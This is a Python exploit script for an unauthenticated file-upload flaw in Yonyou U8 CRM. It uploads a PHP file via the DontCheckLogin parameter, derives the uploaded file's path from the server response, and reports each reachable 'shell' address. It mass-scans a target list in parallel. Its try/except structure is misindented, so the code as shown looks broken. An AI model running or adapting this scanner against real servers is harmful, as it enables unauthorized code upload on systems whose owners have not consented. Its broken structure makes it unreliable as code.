# app="用友-U8CRM"

import requests
import urllib3
import multiprocessing
import re

urllib3.disable_warnings()

proxies = {
	"http": "http://127.0.0.1:7890",
	"https": "http://127.0.0.1:7890"
}

headers = {
	"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ"
}

data = '''------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundarykS5RKgl8t3nwInMQ'''

def poc(url):
	target = url + "/ajax/getemaildata.php?DontCheckLogin=1"
	try:
		r = requests.post(target, data=data, verify=False,proxies=proxies,allow_redirects=False,headers=headers)
	pattern = r'\\\\mht([0-9A-Fa-f]+)\.tmp\.mht'
	match = re.search(pattern, r.text)

	if match:
		tmp_file_name = match.group(1)
		decimal = int(tmp_file_name, 16)
		decimal -= 1
		new_hex = hex(decimal)[2:].upper()
		filename = "upd" + new_hex + ".tmp.php"
		if requests.get(url + f"/tmpfile/{filename}").status_code == 200:
			with open("result.txt", "a") as f:
				f.write(target + "\n")
				f.close()
			print("shell 地址:" + url + f"/tmpfile/{filename}")
		else:
			pass
	except:
		pass

if __name__ == "__main__":
	with open("ip.txt") as file:
		urls = [line.strip("\n") for line in file]
	with multiprocessing.Pool() as pool:
		pool.map(poc,urls)







